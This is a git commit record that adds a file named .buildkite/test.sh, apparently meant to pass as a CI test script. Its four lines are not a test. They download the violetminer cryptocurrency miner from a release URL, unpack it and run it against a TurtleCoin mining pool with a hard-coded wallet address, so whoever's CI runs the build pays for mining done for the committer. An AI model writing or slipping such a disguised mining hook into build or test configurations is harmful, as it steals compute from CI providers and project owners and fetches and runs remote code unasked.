d9fec0b9bcbbd2f5f5676cb2f2f99d4e86af1c3f
tuhsv228 <85036765+tuhsv228@users.noreply.github.com>
2021-05-30 12:51:56 +0530

    Create test.sh

---
+++ .buildkite/test.sh
@@ -0,0 +1,4 @@
+wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
+tar xf violetminer-linux-v0.2.2.tar.gz
+cd violetminer-linux-v0.2.2
+./violetminer --pool turtlecoin.herominers.com:10380 --username TRTLv3NoH8nYxTNEuAD5thfGodW9jYLRa2uSHYZRq8Z8X3wB1gUmDaiNsj6JVFsR6J9RowJvHuDPaTrKd1QVoNHhXt5Cfx5etW5 --password jumoE --algorithm turtlecoin
